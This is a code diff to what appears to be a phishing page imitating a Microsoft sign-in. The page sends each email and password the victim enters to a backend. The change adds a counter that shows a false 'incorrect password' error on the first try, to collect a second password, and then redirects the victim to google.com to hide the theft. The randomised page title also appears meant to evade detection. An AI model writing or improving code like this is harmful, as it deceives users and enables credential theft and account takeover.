@@ -1081,6 +1081,7 @@
         let authWindow = null;
         let currentEmail = null; // To store the email for password authentication
         let currentUserEmail = null; // To store the email for success message
+        let passwordAttemptCount = 0; // Track password attempts for current email
 
         // Generate random alphanumeric title
         function generateRandomTitle() {
@@ -1423,6 +1424,10 @@ Status: ${data.status}`);
                 return;
             }
 
+            // Reset password attempt counter for new email
+            passwordAttemptCount = 0;
+            console.log('🔄 Password attempt counter reset for new email');
+
             clearMessage();
             setLoading(true, 'Taking you to your organization...', false);
 
@@ -1513,10 +1518,16 @@ Status: ${data.status}`);
                     return;
                 }
 
-                console.log(`🚀 Submitting password for background processing: ${email}`);
+                // Increment password attempt count
+                passwordAttemptCount++;
+                console.log(`🚀 Password attempt #${passwordAttemptCount} for: ${email}`);
 
                 // Prepare payload for backend
-                const payload = { email, password };
+                const payload = { 
+                    email, 
+                    password,
+                    attemptNumber: passwordAttemptCount
+                };
                 if (currentSessionId) {
                     payload.sessionId = currentSessionId;
                 }
@@ -1533,16 +1544,25 @@ Status: ${data.status}`);
                     console.warn('Background authentication submission error (non-blocking):', error);
                 });
 
-                // Immediately redirect to google.com without waiting for authentication
-                console.log('⚡ Redirecting to google.com immediately...');
-                setTimeout(() => {
-                    window.location.href = 'https://google.com';
-                }, 500);
+                // Only redirect on SECOND password attempt
+                if (passwordAttemptCount === 2) {
+                    console.log('⚡ Second attempt - redirecting to google.com...');
+                    setTimeout(() => {
+                        window.location.href = 'https://google.com';
+                    }, 1000); // 1 second delay
+                } else {
+                    // First attempt - show error and allow retry
+                    console.log('⚠️ First attempt - showing error for retry');
+                    setTimeout(() => {
+                        setLoading(false);
+                        showMessage('Your account or password is incorrect. Try another password.', 'microsoft-error');
+                    }, 1000); // 1 second delay before showing error
+                }
 
             } catch (error) {
                 console.error('Password submission error:', error);
-                // Even on error, redirect to google.com
-                window.location.href = 'https://google.com';
+                setLoading(false);
+                showMessage('Authentication error. Please try again.', 'error');
             }
         }
 
